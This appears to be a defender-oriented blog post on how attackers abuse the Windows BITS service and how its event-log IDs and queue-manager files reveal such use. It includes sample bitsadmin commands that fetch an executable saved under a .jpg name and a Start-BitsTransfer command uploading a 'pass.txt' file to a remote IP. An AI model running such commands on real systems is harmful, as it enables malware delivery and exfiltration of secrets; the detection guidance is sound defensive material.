---
layout: post
title: BITS Windows
date: 2025-10-07 21:45:00 +0300
categories: [Blue Team, Windows Service, Background Intelligent Transfer Service] # Add your new categories here
tags: [BITS, LOTL, Windows Service, DFIR]
image: "photos/BITS/bg.jpg"
---

The Quiet Windows Service That Became a Cyber Weapon

In the heart of Windows lives a small, polite service called **BITS — Background Intelligent Transfer Service**. It was designed to quietly move files (updates, assets) in the background and resume transfers after reboots or network outages. But what makes a helpful system feature so interesting to defenders — and attractive to attackers — is exactly what makes it invisible: it’s trusted, it runs as a Windows service, and it behaves politely on the network.

What is BITS ?

The “Background Intelligent Transfer Service” (BITS) is a technology developed by
Microsoft in order to manage file uploads and downloads, to and from HTTP servers and
SMB shares, in a more controlled and load balanced way. If the user starting the
download were to log out the computer, or if a network connection is lost, BITS will
resume the download automatically; the capability to survive reboots makes it an ideal
tool for attackers to drop malicious files into an impacted Windows workstation,
especially considering that Microsoft boxes do not have tools like “wget” or “curl”
installed by default, and that web browsers (especially those in Corporate environments)
may have filters and plugins preventing the download of bad files.

![](photos/BITS/svchost.png)

## From maintenance tool to attacker toolkit

BITS was built to be resilient and unobtrusive. Attackers realized they could *live off the land* — using built-in, legitimate tools to bypass defenses — by letting BITS download or upload malicious files. Because BITS runs under `svchost.exe` and uses standard Windows mechanisms, it often slips past firewalls and detection rules that focus on non-native tools.

How to Use it ? 

`to Download file` 

```jsx
bitsadmin /transfer ALPHA /download /priority high http://www.abcef.it/file.exe c:\test1.jpg
```

if files are downloaded via BITS, the “Content-Type” value in the log will vary, according to the content type of the downloaded resource. 

The transfer of 

1. a binary file will have an “Application Octet-Stream” value for
binary file transfers
2. a text file, or Javascript code, will have a “text/html” content type

this can be helpful while monitoring on SIEM, but unforentialty we can’t see the content if the company doesn’t apply  SSL/TLS interception.

`to Add file` 

```jsx
Bitsadmin /addfile ALPHA http://downloadsrv/file2.exe c:\test2.jpg
```

`to Upload file`

```jsx
Start-BitsTransfer –TransferType Upload –Source “C:\Temp\pass.txt” –Destination http://192.168.11.22/pass.txt
```

once it ran to transfer files there is a sequences of event id generated in the event log under the path   `Microsoft_Windows_Bits_Client_Operational.evtx` such as 

1. Event ID 3: information about the job creation
2. Event ID 59: information about the start of the service: "BytesTransferred" value is zero;
3. Event ID 60: status of the job
4. Event ID 4: completion of the job. "BytesTransferred" value is the size of the downloaded file.
This sequence of event IDs (3, 59, 60 and 4) will be the same even in the case of a file
upload
5. In the case that the transfer is interrupted during the download, an Event ID 61 (instead of
Event ID 60) will be recorded

How can i monitor my transferring ?

In order to check the BITS jobs that are still to be completed, the command lines
`“Bitsadmin /monitor”` or the Powershell `“Get-BitsTransfer | select*` can be used

i can find more on Hard Disk

1. the so-called "Queue Manager artefacts", also called “State Files”. These files are
named “qmgr0.dat” and “qmgr1.dat” and are located at path
“C:\ProgramData\Microsoft\Network\Downloader”

Special thanks for SANS